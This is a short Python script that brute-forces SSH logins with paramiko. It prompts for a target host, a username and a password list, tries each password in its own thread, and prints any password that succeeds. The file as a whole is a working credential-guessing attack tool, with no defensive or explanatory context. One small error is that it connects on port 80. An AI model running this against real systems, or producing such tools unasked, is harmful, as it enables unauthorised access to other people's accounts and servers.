import paramiko
import sys, os, termcolor
import threading, time

stop_flag =0

def ssh_connection(password):
    global  stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port=80, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Password Found : ' + password + 'For Account: ' + username ),'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password ),'red'))
    ssh.close()

host = input('[+] Enter the host address: ')
username = input('[+] Enter the username: ')
pw_file = input('[+] Password File: ')
print('\n')

if os.path.exists(pw_file) == False:
    print('[-] That File/Path does not exist')
    sys.exit(1)

print('*** Starting Threaded SSH Bruteforce on' + host + 'with Account: ' + username + '***')
with open(pw_file, 'r') as pw:
    for line in pw.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connection, args=(password,))
        t.start()
        time.sleep(0.5)

